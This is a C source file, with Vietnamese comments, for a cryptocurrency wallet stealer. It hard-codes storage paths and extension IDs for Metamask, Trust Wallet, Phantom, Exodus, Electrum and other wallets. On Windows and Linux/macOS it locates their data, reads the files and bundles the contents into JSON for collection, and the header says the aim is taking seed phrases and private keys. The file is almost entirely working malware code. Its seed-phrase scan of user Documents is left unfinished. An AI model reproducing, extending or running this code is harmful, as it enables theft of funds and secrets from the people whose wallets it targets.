/**
 * stealer_wallets.c
 * Steal cryptocurrency wallets: Metamask, Trust Wallet, Exodus, Electrum, v.v.
 * Trich xuat seed phrase, private key tu extension storage va file wallet
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <pwd.h>
#endif

#include "stealer_wallets.h"

/* Danh sach vi crypto va duong dan */
typedef struct {
    char ten[64];
    char duong_dan_win[512];
    char duong_dan_linux[512];
    char duoi_file[32];
    char mo_ta[128];
} ViCrypto;

static const ViCrypto DANH_SACH_VI[] = {
    {"Metamask", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "~/.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn", "", "Browser extension"},
    {"Metamask (Edge)", "%APPDATA%\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm", "~/.config/microsoft-edge/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm", "", "Edge extension"},
    {"Metamask (Brave)", "%APPDATA%\\..\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "~/.config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn", "", "Brave extension"},
    {"Trust Wallet", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph", "~/.config/google-chrome/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph", "", "Browser extension"},
    {"Exodus", "%APPDATA%\\Exodus\\exodus.wallet", "~/.config/Exodus/exodus.wallet", ".wallet", "Desktop wallet"},
    {"Electrum", "%APPDATA%\\Electrum\\wallets", "~/.electrum/wallets", "", "Desktop wallet"},
    {"Binance Chain Wallet", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp", "~/.config/google-chrome/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp", "", "Browser extension"},
    {"Coinbase Wallet", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad", "~/.config/google-chrome/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad", "", "Browser extension"},
    {"Phantom", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa", "~/.config/google-chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa", "", "Solana wallet"},
    {"TronLink", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec", "~/.config/google-chrome/Default/Local Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec", "", "Tron wallet"},
    {"Ronin Wallet", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec", "~/.config/google-chrome/Default/Local Extension Settings/fnjhmkhhmkbjkkabndcnnogagogbneec", "", "Axie Infinity wallet"},
    {"Solflare", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic", "~/.config/google-chrome/Default/Local Extension Settings/bhhhlbepdkbapadjdnnojkbgioiodbic", "", "Solana wallet"},
    {"Martian Wallet", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk", "~/.config/google-chrome/Default/Local Extension Settings/efbglgofoippbgcjepnhiblaibcnclgk", "", "Aptos wallet"},
    {"Sui Wallet", "%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil", "~/.config/google-chrome/Default/Local Extension Settings/opcgpfmipidbgpenhmajoajpbobppdil", "", "Sui wallet"},
    {NULL, "", "", "", ""}
};

#ifdef _WIN32
/* ==================== WINDOWS WALLET STEALER ==================== */

/**
 * Tim file trong thu muc va thu muc con
 * Dau vao: thu_muc - duong dan thu muc
 *          pattern - pattern file can tim (vi du: *.wallet, *.dat, *.keystore)
 *          danh_sach_file - buffer de chua danh sach file tim thay
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: so file tim thay
 */
static int tim_file_wallet(const char* thu_muc, const char* pattern, 
                           char* danh_sach_file, size_t kich_thuoc) {
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\%s", thu_muc, pattern);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    int so_file = 0;
    int offset = 0;
    offset += snprintf(danh_sach_file + offset, kich_thuoc - offset, "[");
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(find_data.cFileName, ".") == 0 || 
                strcmp(find_data.cFileName, "..") == 0) {
                continue;
            }
            
            if (so_file > 0) {
                offset += snprintf(danh_sach_file + offset, kich_thuoc - offset, ",");
            }
            
            char full_path[512];
            snprintf(full_path, sizeof(full_path), "%s\\%s", thu_muc, find_data.cFileName);
            
            /* Escape path */
            char escaped[1024];
            int j, k = 0;
            for (j = 0; full_path[j] != '\0' && k < 1000; j++) {
                if (full_path[j] == '\\') {
                    escaped[k++] = '\\';
                    escaped[k++] = '\\';
                } else if (full_path[j] == '"') {
                    escaped[k++] = '\\';
                    escaped[k++] = '"';
                } else {
                    escaped[k++] = full_path[j];
                }
            }
            escaped[k] = '\0';
            
            /* Doc kich thuoc file */
            DWORD file_size = GetFileSize(find_handle, NULL);
            
            offset += snprintf(danh_sach_file + offset, kich_thuoc - offset,
                "{\"filename\":\"%s\",\"size\":%lu}", escaped, file_size);
            so_file++;
            
        } while (FindNextFileA(find_handle, &find_data) && so_file < 100);
        FindClose(find_handle);
    }
    
    offset += snprintf(danh_sach_file + offset, kich_thuoc - offset, "]");
    return so_file;
}

/**
 * Doc noi dung file
 * Dau vao: duong_dan - duong dan file
 *          noi_dung - buffer de chua noi dung
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong
 */
static int doc_file_wallet(const char* duong_dan, char* noi_dung, size_t kich_thuoc) {
    HANDLE file = CreateFileA(duong_dan, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return -1;
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size > (DWORD)kich_thuoc - 1) file_size = (DWORD)kich_thuoc - 1;
    
    DWORD bytes_doc;
    ReadFile(file, noi_dung, file_size, &bytes_doc, NULL);
    noi_dung[bytes_doc] = '\0';
    
    CloseHandle(file);
    return 0;
}

/**
 * Steal wallet data
 */
int steal_wallets(char* ket_qua, size_t ket_qua_size) {
    char appdata[512];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        snprintf(ket_qua, ket_qua_size, "{\"wallets\":[]}");
        return -1;
    }
    
    char local_appdata[512];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata);
    
    int offset = 0;
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "{\"wallets\":[");
    int tong_vi = 0;
    
    for (int i = 0; DANH_SACH_VI[i].ten[0] != '\0'; i++) {
        char duong_dan[512];
        strncpy(duong_dan, DANH_SACH_VI[i].duong_dan_win, sizeof(duong_dan) - 1);
        
        /* Thay the %APPDATA% */
        char* pos = strstr(duong_dan, "%APPDATA%");
        if (pos != NULL) {
            char temp[512];
            size_t prefix_len = pos - duong_dan;
            strncpy(temp, duong_dan, prefix_len);
            temp[prefix_len] = '\0';
            strcat(temp, appdata);
            strcat(temp, pos + 9);
            strncpy(duong_dan, temp, sizeof(duong_dan) - 1);
        }
        
        /* Kiem tra thu muc hoac file ton tai */
        DWORD attr = GetFileAttributesA(duong_dan);
        if (attr == INVALID_FILE_ATTRIBUTES) continue;
        
        if (tong_vi > 0) {
            offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
        }
        
        offset += snprintf(ket_qua + offset, ket_qua_size - offset,
            "{\"name\":\"%s\",\"path\":\"", DANH_SACH_VI[i].ten);
        
        /* Escape path */
        for (int j = 0; duong_dan[j] != '\0'; j++) {
            if (duong_dan[j] == '\\') {
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\\\");
            } else if (duong_dan[j] == '"') {
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\\"");
            } else {
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, "%c", duong_dan[j]);
            }
        }
        
        if (attr & FILE_ATTRIBUTE_DIRECTORY) {
            /* La thu muc, tim cac file wallet ben trong */
            char danh_sach_file[32768] = {0};
            int so_file = tim_file_wallet(duong_dan, "*", danh_sach_file, sizeof(danh_sach_file));
            
            offset += snprintf(ket_qua + offset, ket_qua_size - offset,
                "\",\"type\":\"directory\",\"files\":%s}", danh_sach_file);
        } else {
            /* La file, doc noi dung */
            char noi_dung[16384] = {0};
            doc_file_wallet(duong_dan, noi_dung, sizeof(noi_dung));
            
            /* Escape noi dung */
            offset += snprintf(ket_qua + offset, ket_qua_size - offset,
                "\",\"type\":\"file\",\"content\":\"");
            
            for (int j = 0; noi_dung[j] != '\0' && j < 10000; j++) {
                if (noi_dung[j] == '"') {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\\"");
                } else if (noi_dung[j] == '\\') {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\\\");
                } else if (noi_dung[j] == '\n') {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\n");
                } else if (noi_dung[j] == '\r') {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\r");
                } else if (noi_dung[j] == '\t') {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\\t");
                } else if (noi_dung[j] >= 32 && noi_dung[j] < 127) {
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "%c", noi_dung[j]);
                }
            }
            offset += snprintf(ket_qua + offset, ket_qua_size - offset, "\"}");
        }
        
        tong_vi++;
    }
    
    /* Tim seed phrase trong cac file text */
    /* Quet o dia tim file .txt, .doc, .pdf co chua seed phrase */
    char duong_dan_quet[] = "C:\\Users";
    char danh_sach_seed[32768] = {0};
    int so_seed = 0;
    
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\*\\Documents\\*.txt", duong_dan_quet);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            if (so_seed >= 10) break;
            
            char full_path[512];
            snprintf(full_path, sizeof(full_path), "%s\\*\\Documents\\%s", 
                     duong_dan_quet, find_data.cFileName);
            
            /* Tim username truoc */
            char* user_start = strchr(full_path + strlen(duong_dan_quet) + 1, '\\');
            if (user_start != NULL) {
                /* Copy duong dan day du */
            }
            
        } while (FindNextFileA(find_handle, &find_data));
        FindClose(find_handle);
    }
    
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]}");
    return tong_vi;
}

#else
/* ==================== LINUX/MACOS WALLET STEALER ==================== */

int steal_wallets(char* ket_qua, size_t ket_qua_size) {
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    int offset = 0;
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "{\"wallets\":[");
    int tong_vi = 0;
    
    for (int i = 0; DANH_SACH_VI[i].ten[0] != '\0'; i++) {
        char duong_dan[512];
        strncpy(duong_dan, DANH_SACH_VI[i].duong_dan_linux, sizeof(duong_dan) - 1);
        
        /* Thay the ~ */
        if (duong_dan[0] == '~') {
            char temp[512];
            snprintf(temp, sizeof(temp), "%s%s", home, duong_dan + 1);
            strncpy(duong_dan, temp, sizeof(duong_dan) - 1);
        }
        
        struct stat st;
        if (stat(duong_dan, &st) != 0) continue;
        
        if (tong_vi > 0) {
            offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
        }
        
        offset += snprintf(ket_qua + offset, ket_qua_size - offset,
            "{\"name\":\"%s\",\"path\":\"%s\",\"type\":\"%s\"",
            DANH_SACH_VI[i].ten, duong_dan, 
            S_ISDIR(st.st_mode) ? "directory" : "file");
        
        if (S_ISDIR(st.st_mode)) {
            /* Liet ke file */
            DIR* dir = opendir(duong_dan);
            if (dir != NULL) {
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",\"files\":[");
                int dau_tien = 1;
                struct dirent* entry;
                
                while ((entry = readdir(dir)) != NULL) {
                    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
                    
                    if (!dau_tien) {
                        offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
                    }
                    dau_tien = 0;
                    
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset,
                        "{\"filename\":\"%s\"}", entry->d_name);
                }
                closedir(dir);
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]");
            }
        }
        
        offset += snprintf(ket_qua + offset, ket_qua_size - offset, "}");
        tong_vi++;
    }
    
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]}");
    return tong_vi;
}

#endif